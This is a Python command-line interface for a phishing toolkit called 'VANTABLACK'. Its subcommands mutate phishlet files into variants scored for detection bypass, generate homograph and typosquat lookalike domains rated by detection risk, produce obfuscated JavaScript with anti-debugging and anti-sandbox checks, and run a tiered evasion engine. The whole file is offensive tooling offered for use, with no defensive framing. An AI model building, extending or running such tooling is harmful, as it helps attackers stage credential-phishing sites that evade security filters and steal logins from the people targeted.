#!/usr/bin/env python3
"""
VANTABLACK Mutation CLI
=======================

Command-line interface for phishlet mutation and evasion.
"""

import asyncio
import argparse
import json
import sys
from pathlib import Path

from .mutator import PhishletMutator, MutationConfig
from .domain_generator import DomainGenerator
from .obfuscator import JavaScriptObfuscator
from .evasion_engine import EvasionEngine, EvasionLevel


async def main():
    """Main CLI interface"""
    parser = argparse.ArgumentParser(
        description="VANTABLACK Phishlet Mutation Engine"
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # Mutate command
    mutate_parser = subparsers.add_parser('mutate', help='Mutate phishlet files')
    mutate_parser.add_argument('input', help='Input phishlet file')
    mutate_parser.add_argument('--output', '-o', help='Output directory')
    mutate_parser.add_argument('--variants', '-v', type=int, default=5,
                              help='Number of variants to generate')
    mutate_parser.add_argument('--config', help='Mutation config file (JSON)')
    
    # Domain variation command
    domain_parser = subparsers.add_parser('domains', help='Generate domain variations')
    domain_parser.add_argument('domain', help='Base domain')
    domain_parser.add_argument('--count', '-c', type=int, default=10,
                               help='Number of variations')
    domain_parser.add_argument('--output', '-o', help='Output file')
    domain_parser.add_argument('--technique', choices=['all', 'homograph', 'typosquat', 'subdomain'],
                               default='all', help='Specific technique to use')
    
    # JavaScript obfuscation command
    js_parser = subparsers.add_parser('obfuscate', help='Generate obfuscated JavaScript')
    js_parser.add_argument('--output', '-o', help='Output file')
    js_parser.add_argument('--techniques', nargs='+', 
                          choices=['debugger', 'console', 'devtools', 'vm', 'headless', 'timing'],
                          help='Specific techniques to include')
    
    # Evasion engine command
    evasion_parser = subparsers.add_parser('evasion', help='Run evasion engine')
    evasion_parser.add_argument('--level', choices=['low', 'medium', 'high', 'paranoid'],
                                default='medium', help='Evasion level')
    evasion_parser.add_argument('--context', help='Context file (JSON)')
    evasion_parser.add_argument('--output', '-o', help='Output file')
    
    # Batch mutation command
    batch_parser = subparsers.add_parser('batch', help='Batch mutate directory')
    batch_parser.add_argument('directory', help='Directory containing phishlets')
    batch_parser.add_argument('--output', '-o', help='Output directory')
    batch_parser.add_argument('--variants', '-v', type=int, default=3,
                              help='Variants per phishlet')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    try:
        if args.command == 'mutate':
            await mutate_command(args)
        elif args.command == 'domains':
            await domains_command(args)
        elif args.command == 'obfuscate':
            await obfuscate_command(args)
        elif args.command == 'evasion':
            await evasion_command(args)
        elif args.command == 'batch':
            await batch_command(args)
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)


async def mutate_command(args):
    """Handle mutate command"""
    # Load mutation config
    config = MutationConfig()
    if args.config:
        with open(args.config, 'r') as f:
            config_data = json.load(f)
            config = MutationConfig(**config_data)
    
    # Initialize mutator
    mutator = PhishletMutator(config)
    
    # Generate mutations
    print(f"Generating {args.variants} variants for {args.input}...")
    variants = mutator.mutate_phishlet(args.input, num_variants=args.variants)
    
    # Save variants
    output_dir = args.output or './mutated_phishlets'
    saved_files = []
    
    for variant in variants:
        saved_path = mutator.save_mutated_phishlet(variant, output_dir)
        saved_files.append(saved_path)
        print(f"Saved: {saved_path}")
    
    # Generate summary
    summary = {
        'original': args.input,
        'variants_generated': len(variants),
        'mutations_applied': [v.mutations_applied for v in variants],
        'bypass_scores': [v.detection_bypass_score for v in variants],
        'operational_risks': [v.operational_risk for v in variants],
        'saved_files': saved_files
    }
    
    summary_file = Path(output_dir) / 'mutation_summary.json'
    with open(summary_file, 'w') as f:
        json.dump(summary, f, indent=2)
    
    print(f"Summary saved to {summary_file}")


async def domains_command(args):
    """Handle domains command"""
    domain_gen = DomainGenerator()
    
    print(f"Generating {args.count} variations for {args.domain}...")
    
    if args.technique == 'all':
        variations = domain_gen.generate_variations(args.domain, count=args.count)
    else:
        # Use specific technique
        if args.technique == 'homograph':
            variations = domain_gen._generate_homograph_variations(args.domain, '.com')
        elif args.technique == 'typosquat':
            variations = domain_gen._generate_typosquatting(args.domain, '.com')
        elif args.technique == 'subdomain':
            variations = domain_gen._generate_subdomain_variations(args.domain, '.com')
        else:
            variations = []
    
    # Add metadata
    variations_with_meta = []
    for variation in variations[:args.count]:
        similarity = domain_gen.calculate_similarity(args.domain, variation)
        risk = domain_gen.assess_detection_risk(variation)
        technique = domain_gen._detect_technique(args.domain, variation)
        
        variations_with_meta.append({
            'original': args.domain,
            'variation': variation,
            'technique': technique,
            'similarity_score': similarity,
            'detection_risk': risk
        })
    
    # Output results
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(variations_with_meta, f, indent=2)
        print(f"Domain variations saved to {args.output}")
    else:
        print(json.dumps(variations_with_meta, indent=2))


async def obfuscate_command(args):
    """Handle obfuscate command"""
    obfuscator = JavaScriptObfuscator()
    
    print("Generating obfuscated JavaScript...")
    
    if args.techniques:
        script = obfuscator.generate_evasion_script(techniques=args.techniques)
    else:
        script = obfuscator.generate_evasion_script()
    
    # Add additional protections
    anti_tampering = obfuscator.generate_anti_tampering()
    runtime_protection = obfuscator.generate_runtime_protection()
    
    full_script = f"""
{script}

{anti_tampering}

{runtime_protection}
"""
    
    # Output results
    if args.output:
        with open(args.output, 'w') as f:
            f.write(full_script)
        print(f"Obfuscated JavaScript saved to {args.output}")
    else:
        print(full_script)


async def evasion_command(args):
    """Handle evasion command"""
    evasion_engine = EvasionEngine()
    
    # Load context
    context = {}
    if args.context:
        with open(args.context, 'r') as f:
            context = json.load(f)
    
    # Configure evasion level
    level = EvasionLevel(args.level)
    active_techniques = evasion_engine.configure_evasion(level)
    
    print(f"Configuring evasion level: {level.value}")
    print(f"Active techniques: {', '.join(active_techniques)}")
    
    # Execute evasion
    print("Executing evasion techniques...")
    results = evasion_engine.execute_evasion(context)
    
    # Generate report
    effectiveness = evasion_engine.get_effectiveness_score()
    risk = evasion_engine.get_detection_risk()
    
    report = {
        'evasion_level': level.value,
        'active_techniques': active_techniques,
        'execution_results': results,
        'effectiveness_score': effectiveness,
        'detection_risk': risk,
        'configuration': evasion_engine.export_configuration()
    }
    
    # Output results
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        print(f"Evasion report saved to {args.output}")
    else:
        print(json.dumps(report, indent=2, default=str))


async def batch_command(args):
    """Handle batch mutation command"""
    mutator = PhishletMutator()
    
    print(f"Batch mutating phishlets in {args.directory}...")
    
    # Batch mutate
    results = mutator.batch_mutate(
        args.directory, 
        args.output or './batch_mutated',
        variants_per_phishlet=args.variants
    )
    
    # Generate summary
    total_variants = sum(len(files) for files in results.values())
    successful_phishlets = len([files for files in results.values() if files])
    
    summary = {
        'input_directory': args.directory,
        'output_directory': args.output or './batch_mutated',
        'total_phishlets': len(results),
        'successful_mutations': successful_phishlets,
        'total_variants': total_variants,
        'variants_per_phishlet': args.variants,
        'results': results
    }
    
    summary_file = Path(args.output or './batch_mutated') / 'batch_summary.json'
    with open(summary_file, 'w') as f:
        json.dump(summary, f, indent=2)
    
    print(f"Batch mutation complete. Summary saved to {summary_file}")
    print(f"Generated {total_variants} variants from {successful_phishlets} phishlets")


if __name__ == '__main__':
    asyncio.run(main())
